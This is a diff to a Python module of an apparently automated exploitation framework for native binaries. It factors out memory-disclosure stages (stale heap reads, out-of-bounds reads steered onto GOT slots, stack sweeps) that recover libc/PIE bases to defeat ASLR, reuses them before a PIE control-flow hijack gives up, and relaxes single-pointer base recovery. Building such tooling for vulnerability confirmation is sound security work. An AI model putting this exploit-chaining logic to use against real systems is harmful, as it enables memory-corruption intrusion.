@@ -138,6 +138,23 @@ def _disclose_lead(conn, target):
     return max(leads, key=lambda f: f.confidence, default=None)
 
 
+def _run_disclose_stages(ctx, target):
+    """Drive the forgery-proof disclosure chains for an out-of-bounds / uninitialised READ lead:
+    a reclaimed-heap read (free a chunk, read its stale allocator metadata), an OOB array read
+    steered onto a GOT slot, or a stack-frame secret sweep -- each recovers a libc/PIE base (an
+    ASLR defeat) as a poc-backed L3, or self-skips. Returns the first stage's result dict, or None.
+
+    Shared by the no-lead path AND the PIE control-chain fallback: when a PIE memory-corruption
+    hijack cannot confirm (no in-band base for the SAME-process relocate), the disclosure the hijack
+    needs is itself a confirmable L3 -- so extract it rather than stopping at an L2 recipe."""
+    dlead = _disclose_lead(ctx.conn, target)
+    if dlead is None or substrate.native_only_reason(target.file_type, "disclosure"):
+        return None
+    return (_heap_uninit_disclose(ctx, target, dlead)
+            or _oob_read_disclose_stage(ctx, target, dlead)
+            or _stack_secret_disclose_stage(ctx, target, dlead))
+
+
 def _recipe(vclass: str, win, target_bytes: bytes, glibc=None) -> dict:
     """An aaheg technique + concrete write target when a live hijack is not demonstrable. `glibc`
     (major, minor) gates the technique selection correctly (hooks removed in 2.34, safe-linking in
@@ -186,16 +203,9 @@ def chain_primitive_stage(ctx) -> dict:
         # No control-flow primitive to chain -- but an out-of-bounds READ is still weaponizable:
         # steer it onto a GOT slot and DISCLOSE the libc base (a confirmed CWE-125 info leak, and
         # the ASLR-defeat leak the control-flow chains consume). Only when such a lead exists.
-        dlead = _disclose_lead(ctx.conn, target)
-        if dlead is not None and not substrate.native_only_reason(target.file_type, "disclosure"):
-            # Two shapes: a reclaimed-heap read (free a chunk, read its stale allocator metadata)
-            # and an out-of-bounds array read steered onto a GOT slot. Each self-skips if it does
-            # not fit; both recover a libc/PIE base (ASLR defeat) as a poc-backed L3.
-            got = (_heap_uninit_disclose(ctx, target, dlead)
-                   or _oob_read_disclose_stage(ctx, target, dlead)
-                   or _stack_secret_disclose_stage(ctx, target, dlead))
-            if got:
-                return got
+        got = _run_disclose_stages(ctx, target)
+        if got:
+            return got
         ctx.emit("chain.done", payload={"applicable": False,
                  "note": "no heap / out-of-bounds primitive discovered to chain"})
         ctx.progress(pct=100, msg="no primitive lead to chain")
@@ -293,9 +303,19 @@ def chain_primitive_stage(ctx) -> dict:
                 leak_opt, writer, off, trig, base = hit
                 return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
                                     leak_opt=leak_opt, writer=writer, off=off, trig=trig)
+            # The hijack's own bare-option leak did not recover a base -- but a confirmed DISCLOSURE
+            # (the ASLR-defeat leak this very hijack needs) is itself a validated L3. Drive the
+            # richer disclosure chains (steered OOB read / reclaimed-heap / stack sweep) before
+            # falling back to the L2 recipe: they lift this target from "leak-chain not confirmed"
+            # to a poc-backed CWE-200 base disclosure. (Consuming that leak IN-PROCESS to relocate
+            # the win -- the full memory-corruption L3 on PIE -- is the named next technique.)
+            got = _run_disclose_stages(ctx, target)
+            if got:
+                return got
             recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
             _file_recipe(ctx, target, lead, vclass, win, recipe,
-                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed)")
+                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed) "
+                         "[needs: consume a confirmed disclosure in-process to relocate the win]")
             ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                      "vclass": vclass, "win": win_name, "note": "PIE leak-chain not confirmed"})
             ctx.progress(pct=100, msg=f"PIE {vclass}: no in-band leak to relocate {win_name}")
@@ -474,7 +494,12 @@ def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes,
         proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
         out, _ = _pie_drain(proc)
         vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
-        base = exploit.recover_pie_base(vals, target_bytes) if vals else None
+        # allow_single: accept a base anchored on a LONE disclosed image pointer when its page
+        # offset is unique across the image's symbols -- forgery-proof, and the same rule the
+        # disclose stages and detonate.reaches_runtime_address already use. Without it a target that
+        # leaks exactly one image pointer (the common case) yielded no base and the PIE hijack
+        # stopped at "leak-chain not confirmed" even though the leak was there.
+        base = exploit.recover_pie_base(vals, target_bytes, allow_single=True) if vals else None
         if not base:
             return None, b""
         addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
